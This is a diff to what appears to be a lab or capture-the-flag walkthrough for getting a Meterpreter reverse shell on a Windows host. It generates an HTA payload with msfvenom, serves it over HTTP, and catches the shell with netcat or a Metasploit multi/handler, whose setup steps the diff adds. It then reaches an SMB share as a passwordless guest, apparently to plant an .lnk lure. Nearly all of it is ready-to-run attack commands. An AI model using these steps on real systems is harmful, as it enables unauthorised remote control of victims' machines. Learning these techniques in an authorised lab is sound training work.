@@ -12,8 +12,12 @@ Steps in Kali:
     - Run `lnk-creator.sh`, make sure the *.lnk file is in the Desktop.
     - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.8.10 LPORT=4444 -f hta-psh > exploit.hta`.
     - Run `python3 -m http.server 80` and leave it running.
-    - Open new terminal for Metasploit:
-        - nc -lvnp 4444
+    - Open new terminal and use `nc -lvnp 4444`, or use Metasploit:
+        - use exploit/multi/handler
+        - set payload windows/meterpreter/reverse_tcp
+        - set LHOST 192.168.8.10
+        - set LPORT 4444
+        - run
     - Open new terminal smb client
         - Use `smbclient //192.168.8.40/Sharing -U guest`.
         - There is no password for guest user, so just hit `Enter` key for password.
